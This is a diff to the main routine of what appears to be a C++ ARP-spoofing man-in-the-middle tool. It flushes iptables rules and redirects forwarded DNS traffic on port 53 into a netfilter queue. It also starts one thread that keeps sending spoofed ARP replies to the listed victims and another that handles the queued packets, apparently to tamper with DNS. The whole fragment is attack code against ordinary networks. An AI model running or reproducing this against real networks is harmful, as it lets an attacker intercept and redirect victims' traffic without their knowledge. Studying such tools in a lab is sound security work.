@@ -22,7 +22,8 @@ int main (int argc, char **argv) {
   // system("sysctl net.ipv4.conf.all.secure_redirects=0 > /dev/null");
   system("iptables -F");
   system("iptables -F -t nat");
-  system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
+  system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
+  system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
   system("echo `ip route | head -n 1 | awk '{print $3}'` > ./gate_ip");
 
   // read gate_ip to get gateway ip in char*
@@ -43,20 +44,16 @@ int main (int argc, char **argv) {
   }
   cout << '\n';
 
-  // create thread to keep sending arp reply 
-  unsigned char *gw_mac = new unsigned char[6];
-  str2mac(arp_table[gwip].c_str(), gw_mac);
-  thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
-
-  // create thread to keep listening to packets and do filter
-  //thread t2 = thread(filter_thread, ifname.c_str());
   struct need_info nd_info;
   nd_info.ifname = ifname.c_str();
   nd_info.arp_table = arp_table;
-  thread t2 = thread(nfq_thread, 0, nd_info);
-
+  unsigned char *gw_mac = new unsigned char[6];
+  str2mac(arp_table[gwip].c_str(), gw_mac);
+  thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
+  thread t2 = thread(nfq_thread, 1, nd_info);
   t1.join();
   t2.join();
+  
 
   return (EXIT_SUCCESS);
 }
